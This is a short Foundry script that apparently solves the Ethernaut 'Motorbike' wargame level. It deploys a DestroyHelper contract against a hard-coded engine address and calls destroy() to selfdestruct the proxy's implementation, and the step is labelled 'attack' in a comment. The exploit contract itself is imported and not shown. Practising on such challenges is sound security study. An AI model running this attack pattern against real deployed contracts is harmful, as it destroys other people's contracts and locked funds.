// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {DestroyHelper, DestroyEngine} from "../src/25.Motorbike.sol";

contract DestroyEngineScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        // address motorbike = 0x41E03156653c4AD3d1CA58E3C305AC97d8E98513;
        address engine = 0x334F0BABe721cc01aE4C6AcAceC63F404C853Bca;

        // attack
        DestroyHelper helper = new DestroyHelper(engine);

        helper.destroy();

        vm.stopBroadcast();
    }
}
